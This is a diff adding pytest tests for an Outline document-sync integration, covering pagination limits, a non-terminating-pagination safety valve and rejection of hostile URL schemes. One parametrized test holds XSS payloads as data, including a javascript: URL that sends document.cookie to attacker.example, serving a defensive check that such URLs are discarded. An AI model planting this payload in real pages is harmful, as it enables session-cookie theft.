@@ -63,6 +63,30 @@ class _FakeClient:
         return self._collections.get(collection_id, "")
 
 
+class _RepeatingClient:
+    """A client whose ``documents.list`` always returns a full page."""
+
+    def __init__(self) -> None:
+        self.config = _config()
+        self.calls = 0
+
+    def list_documents(
+        self,
+        *,
+        offset: int = 0,
+        limit: int = 100,
+        collection_id: str = "",
+    ) -> list[dict[str, object]]:
+        self.calls += 1
+        return [_doc(f"doc-{offset + i:06d}") for i in range(limit)]
+
+    def get_document(self, document_id: str) -> dict[str, object]:
+        raise AssertionError("not used")
+
+    def get_collection_name(self, collection_id: str) -> str:
+        return ""
+
+
 def _doc(
     doc_id: str,
     updated_at: str = "2026-01-02T03:04:05.000Z",
@@ -110,13 +134,97 @@ def test_snapshot_paginates_until_short_page() -> None:
 
 
 def test_snapshot_respects_max_documents() -> None:
+    """The cap selects the lowest ids, not whatever the server listed first.
+
+    Truncating the server's own order made the retained set depend on a
+    listing order that may vary between runs, and items missing from a
+    snapshot are marked ``pending_removal``.
+    """
     client = _FakeClient(
-        pages=[[_doc("a"), _doc("b"), _doc("c")]],
+        pages=[[_doc("c"), _doc("b"), _doc("a")]],
         documents={},
         config=_config(max_documents=2),
     )
     snapshot = fetch_outline_snapshot(client)
     assert tuple(item.external_id for item in snapshot.items) == ("a", "b")
+
+
+def test_snapshot_max_documents_bounds_the_fetch() -> None:
+    """The cap stops paging; it is not applied after fetching everything."""
+    page = [_doc(f"doc-{i:03d}") for i in range(100)]
+    client = _FakeClient(
+        pages=[page] * 5,
+        documents={},
+        config=_config(max_documents=5),
+    )
+    snapshot = fetch_outline_snapshot(client)
+    assert snapshot.expected_count == 5
+    assert len(client.list_calls) == 1
+
+
+def test_snapshot_terminates_on_empty_page() -> None:
+    """An empty page ends pagination even at an exact page boundary."""
+    page = [_doc(f"doc-{i:03d}") for i in range(100)]
+    client = _FakeClient(pages=[page, []], documents={})
+    snapshot = fetch_outline_snapshot(client)
+    assert snapshot.expected_count == 100
+    assert len(client.list_calls) == 2
+
+
+def test_snapshot_non_terminating_pagination_raises(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """A server returning a full page forever must trip the safety valve."""
+    import local_deep_research.integrations.providers.outline.reconciliation as recon
+
+    monkeypatch.setattr(recon, "_MAX_PAGINATED_DOCUMENTS", 150)
+    client = _RepeatingClient()
+    with pytest.raises(
+        OutlineProtocolError, match="pagination_not_terminating"
+    ):
+        fetch_outline_snapshot(client)
+
+
+def test_snapshot_non_dict_entry_raises() -> None:
+    """A non-dict list element must stay inside the error taxonomy."""
+    client = _FakeClient(pages=[["not-a-dict"]], documents={})
+    with pytest.raises(OutlineProtocolError, match="document_entry_not_object"):
+        fetch_outline_snapshot(client)  # type: ignore[arg-type]
+
+
+@pytest.mark.parametrize(
+    "hostile_url",
+    [
+        "javascript:fetch('https://attacker.example/?c='+document.cookie)",
+        "data:text/html,<script>alert(1)</script>",
+        "vbscript:msgbox(1)",
+    ],
+)
+def test_fetch_outline_document_rejects_non_http_url(
+    hostile_url: str,
+) -> None:
+    """A hostile scheme from the server must never become a source URL.
+
+    ``source_url`` is stored as ``Document.original_url`` and rendered as an
+    ``<a href>``; Jinja escapes quotes but not the scheme.
+    """
+    item = RemoteSnapshotItem(
+        external_id="doc-1", provider_revision="x", revision="a" * 64
+    )
+    client = _FakeClient(
+        pages=[],
+        documents={
+            "doc-1": {
+                "id": "doc-1",
+                "title": "T",
+                "text": "body",
+                "url": hostile_url,
+            }
+        },
+    )
+    assert (
+        fetch_outline_document(client, item).url == "outline://document/doc-1"
+    )
 
 
 def test_snapshot_filters_by_configured_collection() -> None:
@@ -128,7 +236,7 @@ def test_snapshot_filters_by_configured_collection() -> None:
     assert (
         client.list_calls[0]["collection_id"]
         == "c1f9b8e2-1234-5678-9abc-def012345678"
-)
+    )
 
 
 def test_snapshot_empty_instance_raises() -> None:
